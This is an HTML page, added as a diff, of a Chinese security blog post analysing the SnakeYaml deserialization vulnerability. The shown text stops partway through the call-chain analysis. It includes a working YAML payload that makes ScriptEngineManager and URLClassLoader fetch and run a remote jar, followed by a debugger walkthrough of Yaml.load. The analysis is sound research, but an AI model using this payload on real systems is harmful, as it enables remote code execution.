@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="YAML简介snakeyaml包主要用来解析yaml格式的内容，yaml语言比普通的xml与properties等配置文件的可读性更高，Spring系列就支持yaml的配置文件，而SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。 yaml语法中需要注意以下几点： -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SnakeYaml">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="YAML简介snakeyaml包主要用来解析yaml格式的内容，yaml语言比普通的xml与properties等配置文件的可读性更高，Spring系列就支持yaml的配置文件，而SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。 yaml语法中需要注意以下几点： -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813156370-8dbe90cc-dd14-4cd2-9224-6d2300a4ffca.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813156575-2915a328-6778-4af6-9e6b-00c8fd13e8b8.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813156863-0885a9fd-5cd9-467e-801b-9db4938e9e35.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813157034-618c5c35-2ffb-4b8b-98c4-8e0b9518eeb3.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813157198-6b790e5b-4477-414b-bce1-1dc49e7c927b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813157354-bdbfc5b2-a94b-4f4f-b210-939ede7ba78a.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813157578-72c18e3f-929a-4c06-a862-3defea471e84.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813157740-97a02f6c-d08b-408d-b589-8f5962aed7da.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813157874-77f2a68e-d66e-43ae-a7fc-78895993d32e.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813158016-4c6e8ab6-1b76-454c-8893-9e11a6a478a7.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813158150-56249894-6695-4ff0-b11c-dfc3c297ccdc.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813158278-3e1521a2-ecd2-4bcd-87a6-02658f358454.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813158408-caa4dbdc-226b-4784-99ee-937202d79125.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813158539-59ee5977-a209-463c-a756-9f330b6b442b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813158653-d0c21577-e4a1-46d6-a1dd-2b709146fc7f.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159078-9cab1e5d-64e2-40f8-8325-197b27a902fa.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159240-60da2c47-f2e6-45ea-bc66-3bbd87d0bac7.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159362-bd7679e4-4403-4f4f-a6f1-480c8fdb7e1a.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159464-df8d0119-aac4-4d4c-83a2-99dd20bbd722.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159566-ae2f219d-87af-4e10-8d37-355d55a9780a.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159709-017fe583-9ed1-4737-a57e-d35584e0ec77.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159848-ec87a1bf-efc7-46f9-afdb-12fc332806da.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813159967-c69aa779-f42d-4eda-97c0-5b811475362c.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160140-6a393f75-5929-4af7-99c6-b36d6d19f9bc.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160295-5e2d6f82-4c2c-49bf-a5db-c2dddbbc1f9d.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160376-b73fa3d9-1e7a-4aca-b121-367e2fdee3a8.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160465-149c6d41-7e11-45ae-aa4c-c352ad088a1c.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160562-cfefaeb7-7f98-4c05-b5a3-4630657c957a.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160657-4874abe9-c01f-4c8c-8859-b85ee4226420.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160819-ca33f074-57ef-4a13-a7d7-c8527dbdf125.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813160977-33f213b5-3e10-410a-b9ce-cc398797d41a.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813161116-4c9f4daf-f7ec-456e-89c4-3276e1d694fc.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813161236-89e351e6-557d-486b-b475-40bdb25bcde1.png">
+<meta property="article:published_time" content="2023-09-25T06:52:00.000Z">
+<meta property="article:modified_time" content="2024-12-19T04:22:39.185Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/1709813156370-8dbe90cc-dd14-4cd2-9224-6d2300a4ffca.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>SnakeYaml</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/01/Groovy/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/06/25/C3P0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&text=SnakeYaml"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&is_video=false&description=SnakeYaml"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SnakeYaml&body=Check out this article: https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&title=SnakeYaml"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&name=SnakeYaml&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2023/09/25/SnakeYaml/&t=SnakeYaml"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#YAML%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">YAML简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">SnakeYaml序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">SnakeYaml反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.2.</span> <span class="toc-text">补充</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI%E6%9C%BA%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">SPI机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadgets"><span class="toc-number">4.</span> <span class="toc-text">Gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">4.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-PropertyPathFactoryBean"><span class="toc-number">4.2.</span> <span class="toc-text">Spring PropertyPathFactoryBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Commons-Configuration"><span class="toc-number">4.3.</span> <span class="toc-text">Apache Commons Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-XBean"><span class="toc-number">4.4.</span> <span class="toc-text">Apache XBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-JndiRefForwardingDataSource"><span class="toc-number">4.5.</span> <span class="toc-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource"><span class="toc-number">4.6.</span> <span class="toc-text">Resource</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0"><span class="toc-number">5.1.</span> <span class="toc-text">C3P0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson"><span class="toc-number">5.2.</span> <span class="toc-text">Fastjson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">6.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%96%B9%E5%BC%8F"><span class="toc-number">7.</span> <span class="toc-text">探测方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPI"><span class="toc-number">7.1.</span> <span class="toc-text">SPI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashCode"><span class="toc-number">7.2.</span> <span class="toc-text">HashCode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">8.1.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.2.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SnakeYaml
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-25T06:52:00.000Z" class="dt-published" itemprop="datePublished">2023-09-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="YAML简介"><a href="#YAML简介" class="headerlink" title="YAML简介"></a>YAML简介</h2><p>snakeyaml包主要用来解析yaml格式的内容，yaml语言比普通的xml与properties等配置文件的可读性更高，Spring系列就支持yaml的配置文件，而SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。</p>
+<p>yaml语法中需要注意以下几点：</p>
+<pre><code>- YAML区分大小写；
+- YAML文件使用.yaml作为扩展名；
+- YAML在创建YAML文件时不允许使用制表符，只允许使用空格。
+</code></pre>
+<p>yaml基本要素概要：</p>
+<pre><code>- YAML中的注释以#字符开头；
+- 必须通过空格将注释与其他标记分开；
+- 空白的缩进用于表示结构；
+- 标签不包含在YAML文件的缩进中；
+- 列表成员用前导连字符-表示；
+- 列表成员用方括号括起来，并以逗号分隔；
+- 关联数组使用冒号:以键值对的格式表示，并用大括号括起来&#123;&#125;；
+- 具有单个流的多个文档用3个连字符---分隔；
+- 每个文件中的重复节点最初用＆符号＆表示，稍后用星号*标记；
+- YAML总是需要使用冒号和逗号作为列表分隔符，后跟带有标量值的空格；
+- 节点应标有感叹号!或双重感叹号!!，后跟字符串，可以扩展为URI或URL。
+</code></pre>
+<h2 id="SnakeYaml序列化与反序列化"><a href="#SnakeYaml序列化与反序列化" class="headerlink" title="SnakeYaml序列化与反序列化"></a>SnakeYaml序列化与反序列化</h2><p>SnakeYaml中分别由Yaml.dump和Yaml.load方法对yaml数据进行序列化和反序列化操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String age;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is construct function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is getAge function&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is getName function&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is setAge function&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is setName function&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vuln.snakeyaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Serialize();</span><br><span class="line">        Deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="string">&quot;21&quot;</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;Duke&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dumpData</span> <span class="operator">=</span> yaml.dump(person);</span><br><span class="line">        System.out.println(dumpData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dumpData</span> <span class="operator">=</span> <span class="string">&quot;!!org.vuln.snakeyaml.Person &#123;age: 21, name: Tom&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">loadData</span> <span class="operator">=</span> (Person) yaml.load(dumpData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上文中序列化操作中输出字符串!!org.vuln.snakeyaml.Person {age: ‘21’, name: Duke}，其中!!符号类似于fastjson中的@type，用于指定反序列化的类名；反序列化操作中调用了被反序列化的类的构造方法和yaml格式内容中包含的属性的setter方法：</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813156370-8dbe90cc-dd14-4cd2-9224-6d2300a4ffca.png"></p>
+<h2 id="SnakeYaml反序列化漏洞"><a href="#SnakeYaml反序列化漏洞" class="headerlink" title="SnakeYaml反序列化漏洞"></a>SnakeYaml反序列化漏洞</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>SnakeYaml的反序列化操作Yaml.load类似于Fastjson，yaml数据在反序列化时可以通过!!加全类名来指定反序列化的类，反序列化过程中会实例化该类。因此，攻击者可以通过构造ScriptEngineManager的payload并利用SPI机制，通过URLClassLoader或者其他payload，例如JNDI方式远程加载实例化恶意类从而实现任意代码执行。</p>
+<p>当Yaml.load方法的参数外部可控时，攻击者可以传入一个包含恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时，便会触发SnakeYaml反序列化漏洞。</p>
+<p>下文通过ScriptEngineManager这条利用链来分析一下SnakeYaml反序列化漏洞的一个大致调用过程。</p>
+<p>参考项目<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload/%EF%BC%8C%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E7%9A%84jar%E5%8C%85%EF%BC%8C%E6%9E%84%E9%80%A0yaml%E6%95%B0%E6%8D%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/artsploit/yaml-payload/，生成恶意的jar包，构造yaml数据如下：</a></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8080/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/SnakeYaml/1709813156575-2915a328-6778-4af6-9e6b-00c8fd13e8b8.png"></p>
+<p>在Yaml.load处下个断点，首先是一个赋值操作，调用StringReader方法处理传入的数据，将字符串存储在StreamReader的this.stream字段值中。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813156863-0885a9fd-5cd9-467e-801b-9db4938e9e35.png"></p>
+<p>接着调用org.yaml.snakeyaml.Yaml#loadFromReader方法，前面先是一系列的赋值操作，接着将传入的数据封装成一个Composer对象。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813157034-618c5c35-2ffb-4b8b-98c4-8e0b9518eeb3.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813157198-6b790e5b-4477-414b-bce1-1dc49e7c927b.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813157354-bdbfc5b2-a94b-4f4f-b210-939ede7ba78a.png"></p>
+<p>在赋值操作调用org.yaml.snakeyaml.parser.ParserImpl的有参构造方法时，有一个替换规则需要注意，即!! -&gt; tag:yaml.org,2002:，后续会利用该替换规则将传入的数据进行字符串替换操作。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813157578-72c18e3f-929a-4c06-a862-3defea471e84.png"></p>
+<p>接着调用org.yaml.snakeyaml.constructor.BaseConstructor#getSingleData方法，调用org.yaml.snakeyaml.composer.Composer#getSingleNode方法，并根据之前的替换规则对!!符号进行替换。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813157740-97a02f6c-d08b-408d-b589-8f5962aed7da.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813157874-77f2a68e-d66e-43ae-a7fc-78895993d32e.png"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:javax.script.ScriptEngineManager,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:java.net.URLClassLoader,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:seq,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode</span> <span class="string">(tag=tag:yaml.org,2002:java.net.URL,</span> <span class="string">value=[&lt;org.yaml.snakeyaml.nodes.ScalarNode</span> <span class="string">(tag=tag:yaml.org,2002:str,</span> <span class="string">value=http://127.0.0.1:8080/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着调用org.yaml.snakeyaml.constructor.BaseConstructor#constructDocument方法，经过一系列调用，直到调用org.yaml.snakeyaml.constructor.Constructor#getConstructor方法。</p>
+<p><img src="/2023/09/25/SnakeYaml/1709813158016-4c6e8ab6-1b76-454c-8893-9e11a6a478a7.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813158150-56249894-6695-4ff0-b11c-dfc3c297ccdc.png"></p>
+<p><img src="/2023/09/25/SnakeYaml/1709813158278-3e1521a2-ecd2-4bcd-87a6-02658f358454.png"></p>
